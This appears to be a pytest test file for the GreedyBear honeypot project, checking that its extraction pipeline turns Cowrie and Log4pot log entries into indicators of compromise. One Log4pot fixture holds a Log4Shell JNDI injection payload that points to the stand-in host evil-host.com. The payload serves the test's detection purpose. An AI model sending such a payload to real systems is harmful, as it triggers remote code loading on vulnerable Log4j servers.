import pytest
import logging
from unittest.mock import MagicMock, patch
from greedybear.extraction.extraction_pipeline import ExtractionPipeline
from greedybear.extraction.strategies.cowrie import CowrieExtractionStrategy

@pytest.fixture
def cowrie_valid_log():
    return [
        {
            "eventid": "cowrie.session.connect",
            "src_ip": "8.8.8.8",
            "dest_port": 22,
            "username": "root",
            "type": "cowrie",
            "session": "abc123def456",
            "timestamp": "2023-01-01T10:00:00",
            "@timestamp": "2023-01-01T10:00:00",
            "t-pot_ip_ext": "192.168.1.1"
        }
    ]

@pytest.fixture
def empty_log():
    return []

@pytest.fixture
def malformed_log():
    return [{"invalid": "data"}]

@pytest.fixture
def cowrie_log_1():
    return {
        "eventid": "cowrie.session.connect",
        "src_ip": "8.8.8.8",
        "type": "cowrie",
        "session": "abc123def456",
        "timestamp": "2023-01-01T10:00:00",
        "@timestamp": "2023-01-01T10:00:00"
    }

@pytest.fixture
def cowrie_log_2():
    return {
        "eventid": "cowrie.session.connect",
        "src_ip": "8.8.4.4",
        "type": "cowrie",
        "session": "def456abc123",
        "timestamp": "2023-01-01T10:00:01",
        "@timestamp": "2023-01-01T10:00:01"
    }

@pytest.fixture
def log4pot_exploit_log():
    return [
        {
            "type": "log4pot",
            "reason": "request",
            "src_ip": "8.8.8.8",
            "correlation_id": "corr123",
            "timestamp": "2023-01-01T12:00:00",
            "@timestamp": "2023-01-01T12:00:00"
        },
        {
            "type": "log4pot",
            "reason": "exploit",
            "src_ip": "8.8.8.8",
            "correlation_id": "corr123",
            "deobfuscated_payload": "${jndi:ldap://evil-host.com:1389/a}",
            "timestamp": "2023-01-01T12:00:01",
            "@timestamp": "2023-01-01T12:00:01"
        }
    ]






@pytest.fixture
def mock_update_scores():
    with patch("greedybear.extraction.extraction_pipeline.UpdateScores") as mock:
        yield mock

@pytest.mark.django_db
def test_extraction_pipeline_with_cowrie_log(cowrie_valid_log, mock_update_scores):
    pipeline = ExtractionPipeline()
    # Mocking external repos
    pipeline.elastic_repo = MagicMock()
    pipeline.ioc_repo = MagicMock()
    pipeline.sensor_repo = MagicMock()
    
    # Mock ioc_repo.is_ready_for_extraction to return True
    pipeline.ioc_repo.is_ready_for_extraction.return_value = True
    
    # Mock ioc_processor.add_ioc to return a mock record
    with patch("greedybear.extraction.strategies.base.IocProcessor") as mock_processor_class:
        mock_processor = mock_processor_class.return_value
        from greedybear.models import IOC
        mock_record = IOC(name="8.8.8.8", type="ip")
        mock_record.save()
        mock_processor.add_ioc.return_value = mock_record


        
        result = pipeline.run(cowrie_valid_log)

        assert result is not None
        assert len(result) > 0
        assert any(ioc.type == "ip" for ioc in result)
        mock_update_scores.return_value.score_only.assert_called()

@pytest.mark.django_db
def test_extraction_pipeline_with_empty_input(empty_log, mock_update_scores):
    pipeline = ExtractionPipeline()
    result = pipeline.run(empty_log)

    assert result == []
    mock_update_scores.return_value.score_only.assert_not_called()

@pytest.mark.django_db
def test_extraction_pipeline_with_malformed_input(malformed_log, mock_update_scores):
    pipeline = ExtractionPipeline()
    result = pipeline.run(malformed_log)

    assert isinstance(result, list)
    assert len(result) == 0

@pytest.mark.django_db
def test_pipeline_selects_cowrie_strategy(cowrie_valid_log, mock_update_scores):
    pipeline = ExtractionPipeline()
    
    # Mock dependencies
    pipeline.ioc_repo = MagicMock()
    pipeline.ioc_repo.is_ready_for_extraction.return_value = True

    with patch("greedybear.extraction.strategies.factory.ExtractionStrategyFactory.get_strategy") as mock_get_strategy:
        pipeline.run(cowrie_valid_log)
        mock_get_strategy.assert_called_with("cowrie")

@pytest.mark.django_db
def test_pipeline_multiple_entries(cowrie_log_1, cowrie_log_2, mock_update_scores):
    logs = [cowrie_log_1, cowrie_log_2]
    pipeline = ExtractionPipeline()
    
    # Mock dependencies
    pipeline.ioc_repo = MagicMock()
    pipeline.ioc_repo.is_ready_for_extraction.return_value = True
    
    with patch("greedybear.extraction.strategies.base.IocProcessor") as mock_processor_class:
        mock_processor = mock_processor_class.return_value
        from greedybear.models import IOC
        ioc1 = IOC(name="8.8.8.8", type="ip")
        ioc1.save()
        ioc2 = IOC(name="8.8.4.4", type="ip")
        ioc2.save()
        mock_processor.add_ioc.side_effect = [ioc1, ioc2]
        
        result = pipeline.run(logs)
        assert len(result) >= 2

@pytest.mark.django_db
def test_extraction_pipeline_with_log4pot(log4pot_exploit_log, mock_update_scores):
    pipeline = ExtractionPipeline()
    pipeline.ioc_repo = MagicMock()
    pipeline.ioc_repo.is_ready_for_extraction.return_value = True

    with patch("greedybear.extraction.strategies.base.IocProcessor") as mock_processor_class:
        mock_processor = mock_processor_class.return_value
        from greedybear.models import IOC
        ioc = IOC(name="8.8.8.8", type="ip")
        ioc.save()
        mock_processor.add_ioc.return_value = ioc

        
        result = pipeline.run(log4pot_exploit_log)

        
        # Log4pot should have found at least the scanner and the payload hostname
        assert len(result) >= 1


        assert any(call.args[0].name == "8.8.8.8" for call in mock_processor.add_ioc.call_args_list)
        assert any(call.args[0].name == "evil-host.com" for call in mock_processor.add_ioc.call_args_list)



